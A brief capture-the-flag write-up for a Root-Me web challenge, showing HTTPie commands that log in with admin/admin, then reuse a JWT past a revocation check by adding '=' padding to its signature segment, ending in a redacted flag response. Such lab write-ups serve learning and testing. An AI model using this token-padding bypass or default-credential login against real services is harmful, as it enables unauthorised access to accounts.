Step 1:
Fuzz a little, realize that it is possible to generate a token with :

echo '{ “username”: “admin”, “password”: “admin” }' | http http://challenge01.root-me.org/web-serveur/ch63/login

Step 2 :
Submit with :

http get http://challenge01.root-me.org/web-serveur/ch63/admin “Authorization: Bearer <TOKEN>”

Step 3 :
Realize that you can't bf the key and therefore can't forge a jwt, that you can't change the algos to “none” or symmetric (trial / error).

Attempt:

Try changing the base64 paddings. The first two segments of the JWT don't work because they alter the signature, but changing the third segment with padding (adding an '=' at the end) allows us not to change the value of the signature while retaining a valid token.

http -b get http://challenge01.root-me.org/web-serveur/ch63/admin “Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9. eyJpZGVudGl0eSI6ImFkbWluIiwidHlwZSI6ImFjY2VzcyIsImp0aSI6IjQ5YWFiZDdjLTgxODctNGFkOC05OWU1LTYzNzVmMGY5MDA2MSIsImV4cCI6MTU4NDczNjE4MCwibmJmIjoxNTg0NzM2MDAwLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTU4NDczNjAwMH0. jgi5EZsv7hYKrcJS2uFWtp7N6WD8M7yByZRiVS9wPCY=”

{
   “Congratzzzz!!!_flag:": ”*******”
}